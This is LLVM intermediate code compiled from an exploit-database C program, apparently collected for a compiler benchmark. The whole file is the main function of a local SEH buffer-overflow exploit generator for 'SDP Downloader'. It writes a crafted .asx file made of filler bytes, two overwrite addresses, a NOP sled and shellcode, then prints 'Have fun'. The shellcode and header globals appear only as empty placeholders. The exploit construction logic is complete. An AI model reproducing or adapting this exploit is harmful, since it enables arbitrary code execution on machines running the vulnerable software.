; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_8540.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_8540.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [73 x i8] c"_______________________________________________________________________\0A\00", align 1
@.str.1 = private unnamed_addr constant [57 x i8] c"\0A\09\09 SDP Downloader local Buffer overflow Exploit [seh]\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c"\09USAGE : %s filename.asx\0A\00", align 1
@.str.3 = private unnamed_addr constant [75 x i8] c"_________________________________________________________________________\0A\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"w+b\00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@head1 = common dso_local global i32* null, align 8
@OFFSET = common dso_local global i32 0, align 4
@scode = common dso_local global i32* null, align 8
@head2 = common dso_local global i32* null, align 8
@.str.6 = private unnamed_addr constant [41 x i8] c"%s has benn created !! \0A Have fun \0A DONE\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 -1869606677, i32* %8, align 4
  store i32 2089279028, i32* %9, align 4
  store i32 0, i32* %10, align 4
  %11 = load i32, i32* %4, align 4
  %12 = icmp ne i32 %11, 2
  br i1 %12, label %13, label %24

13:                                               ; preds = %2
  %14 = load i32, i32* @stdout, align 4
  %15 = call i32 @fprintf(i32 %14, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str, i64 0, i64 0))
  %16 = load i32, i32* @stdout, align 4
  %17 = call i32 @fprintf(i32 %16, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.1, i64 0, i64 0))
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0), i8* %20)
  %22 = load i32, i32* @stdout, align 4
  %23 = call i32 @fprintf(i32 %22, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.3, i64 0, i64 0))
  br label %24

24:                                               ; preds = %13, %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call i32* @fopen(i8* %27, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0))
  store i32* %28, i32** %6, align 8
  %29 = icmp eq i32* %28, null
  br i1 %29, label %30, label %33

30:                                               ; preds = %24
  %31 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0))
  %32 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %32, i32* %3, align 4
  br label %141

33:                                               ; preds = %24
  %34 = load i32*, i32** @head1, align 8
  %35 = call i32 @strlen(i32* %34)
  %36 = load i32, i32* @OFFSET, align 4
  %37 = add nsw i32 %35, %36
  %38 = add nsw i32 %37, 4
  %39 = add nsw i32 %38, 4
  %40 = load i32*, i32** @scode, align 8
  %41 = call i32 @strlen(i32* %40)
  %42 = add nsw i32 %39, %41
  %43 = add nsw i32 %42, 10
  %44 = load i32*, i32** @head2, align 8
  %45 = call i32 @strlen(i32* %44)
  %46 = add nsw i32 %43, %45
  %47 = call i64 @malloc(i32 %46)
  %48 = inttoptr i64 %47 to i8*
  store i8* %48, i8** %7, align 8
  %49 = load i8*, i8** %7, align 8
  %50 = load i32*, i32** @head1, align 8
  %51 = call i32 @strlen(i32* %50)
  %52 = load i32, i32* @OFFSET, align 4
  %53 = add nsw i32 %51, %52
  %54 = add nsw i32 %53, 4
  %55 = add nsw i32 %54, 4
  %56 = load i32*, i32** @scode, align 8
  %57 = call i32 @strlen(i32* %56)
  %58 = add nsw i32 %55, %57
  %59 = add nsw i32 %58, 10
  %60 = load i32*, i32** @head2, align 8
  %61 = call i32 @strlen(i32* %60)
  %62 = add nsw i32 %59, %61
  %63 = call i32 @memset(i8* %49, i32 65, i32 %62)
  %64 = load i8*, i8** %7, align 8
  %65 = load i32*, i32** @head1, align 8
  %66 = load i32*, i32** @head1, align 8
  %67 = call i32 @strlen(i32* %66)
  %68 = call i32 @memcpy(i8* %64, i32* %65, i32 %67)
  %69 = load i32, i32* @OFFSET, align 4
  store i32 %69, i32* %10, align 4
  %70 = load i8*, i8** %7, align 8
  %71 = load i32*, i32** @head1, align 8
  %72 = call i32 @strlen(i32* %71)
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %70, i64 %73
  %75 = load i32, i32* %10, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8, i8* %74, i64 %76
  %78 = call i32 @memcpy(i8* %77, i32* %8, i32 4)
  %79 = load i32, i32* %10, align 4
  %80 = add nsw i32 %79, 4
  store i32 %80, i32* %10, align 4
  %81 = load i8*, i8** %7, align 8
  %82 = load i32*, i32** @head1, align 8
  %83 = call i32 @strlen(i32* %82)
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  %86 = load i32, i32* %10, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds i8, i8* %85, i64 %87
  %89 = call i32 @memcpy(i8* %88, i32* %9, i32 4)
  %90 = load i32, i32* %10, align 4
  %91 = add nsw i32 %90, 4
  store i32 %91, i32* %10, align 4
  %92 = load i8*, i8** %7, align 8
  %93 = load i32*, i32** @head1, align 8
  %94 = call i32 @strlen(i32* %93)
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i8, i8* %92, i64 %95
  %97 = load i32, i32* %10, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8, i8* %96, i64 %98
  %100 = call i32 @memset(i8* %99, i32 144, i32 10)
  %101 = load i32, i32* %10, align 4
  %102 = add nsw i32 %101, 10
  store i32 %102, i32* %10, align 4
  %103 = load i8*, i8** %7, align 8
  %104 = load i32*, i32** @head1, align 8
  %105 = call i32 @strlen(i32* %104)
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8, i8* %103, i64 %106
  %108 = load i32, i32* %10, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = load i32*, i32** @scode, align 8
  %112 = load i32*, i32** @scode, align 8
  %113 = call i32 @strlen(i32* %112)
  %114 = call i32 @memcpy(i8* %110, i32* %111, i32 %113)
  %115 = load i32*, i32** @scode, align 8
  %116 = call i32 @strlen(i32* %115)
  %117 = load i32, i32* %10, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %10, align 4
  %119 = load i8*, i8** %7, align 8
  %120 = load i32*, i32** @head1, align 8
  %121 = call i32 @strlen(i32* %120)
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %119, i64 %122
  %124 = load i32, i32* %10, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i8, i8* %123, i64 %125
  %127 = load i32*, i32** @head2, align 8
  %128 = load i32*, i32** @head2, align 8
  %129 = call i32 @strlen(i32* %128)
  %130 = call i32 @memcpy(i8* %126, i32* %127, i32 %129)
  %131 = load i32*, i32** @head2, align 8
  %132 = call i32 @strlen(i32* %131)
  %133 = load i32, i32* %10, align 4
  %134 = add nsw i32 %133, %132
  store i32 %134, i32* %10, align 4
  %135 = load i8*, i8** %7, align 8
  %136 = load i32*, i32** %6, align 8
  %137 = call i32 @fputs(i8* %135, i32* %136)
  %138 = load i32*, i32** %6, align 8
  %139 = call i32 @fclose(i32* %138)
  %140 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %141

141:                                              ; preds = %33, %30
  %142 = load i32, i32* %3, align 4
  ret i32 %142
}

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32*, i32) #1

declare dso_local i32 @fputs(i8*, i32*) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
